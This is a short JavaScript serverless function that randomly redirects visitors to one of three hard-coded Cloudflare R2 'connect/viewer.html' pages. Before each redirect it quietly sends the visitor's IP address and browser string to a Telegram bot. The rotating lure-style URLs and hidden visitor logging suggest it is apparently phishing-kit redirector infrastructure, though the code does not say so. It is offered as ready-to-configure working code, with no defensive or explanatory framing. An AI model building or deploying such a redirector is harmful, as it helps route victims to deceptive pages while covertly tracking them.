// Render Function - RANDOM Link Redirector with Telegram Alert

// --- 1. CONFIGURE YOUR LINKS ---
// Replace these with your actual destination URLs.
const LINKS = [
  "https://pub-8a42e2539dfd405d9665c55a6a5f34d4.r2.dev/connect/viewer.html",
  "https://pub-e3b2f081a2b24c90a03f4c0535508271.r2.dev/connect/viewer.html",
  "https://pub-71ac9f4887dd431fb220885381142f4e.r2.dev/connect/viewer.html",
];

// --- 2. CONFIGURE YOUR TELEGRAM DETAILS ---
// Replace these with your actual Telegram Bot Token and Chat ID.
const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";

export default async (req) => {
  // Pick a link randomly from the list.
  const randomIndex = Math.floor(Math.random() * LINKS.length);
  const targetUrl = LINKS[randomIndex];

  // Gather visitor information from the request.
  const visitorInfo = {
    ip: req.headers.get('x-forwarded-for') || 'Unknown',
    userAgent: req.headers.get('User-Agent') || 'Unknown',
  };

  // Log the request to ensure it's only being processed once
  console.log(`Processing request from ${visitorInfo.ip} to ${targetUrl}`);

  // Send the Telegram alert in the background without slowing down the user.
  sendTelegramAlert(req.url, targetUrl, visitorInfo);

  // Immediately redirect the user to the chosen URL.
  return new Response(null, {
    status: 302,
    headers: {
      Location: targetUrl,
    },
  });
};

/**
 * Sends an alert to a Telegram chat.
 */
async function sendTelegramAlert(originalUrl, finalUrl, visitorInfo) {
  // Check if Telegram details are filled out.
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN_HERE") {
    console.error('Telegram credentials are not configured or are still placeholders.');
    return;
  }

  const timestamp = new Date().toISOString();
  const message = `
🔔 *Random Link Alert*
• *From*: ${escapeMarkdown(originalUrl)}
• *To*: ${escapeMarkdown(finalUrl)}
• *Status*: ✅ Redirected
• *Timestamp*: \`${timestamp}\`
• *IP*: \`${visitorInfo.ip}\`
• *System*: \`${escapeMarkdown(shorten(visitorInfo.userAgent))}\`
  `.trim();

  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "MarkdownV2", // Using V2 for better escaping
    disable_web_page_preview: true
  };

  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    console.log('Sending Telegram notification...');
    const resp = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    });

    if (!resp.ok) {
      console.error(`Telegram API error: ${resp.status} ${await resp.text()}`);
    } else {
      console.log('Telegram notification sent successfully.');
    }
  } catch (error) {
    console.error('Failed to send Telegram request:', error);
  }
}

/**
 * Helper function to shorten a string.
 */
function shorten(text, maxLength = 40) {
  if (text.length <= maxLength) return text;
  return text.substring(0, maxLength - 3) + '...';
}

/**
 * Helper function to escape special characters for Telegram MarkdownV2.
 */
function escapeMarkdown(text) {
  if (!text) return '';
  const charsToEscape = '_*[]()~`>#+-=|{}.!';
  return text.replace(new RegExp(`[${charsToEscape.replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&')}]`, 'g'), '\\$&');
}
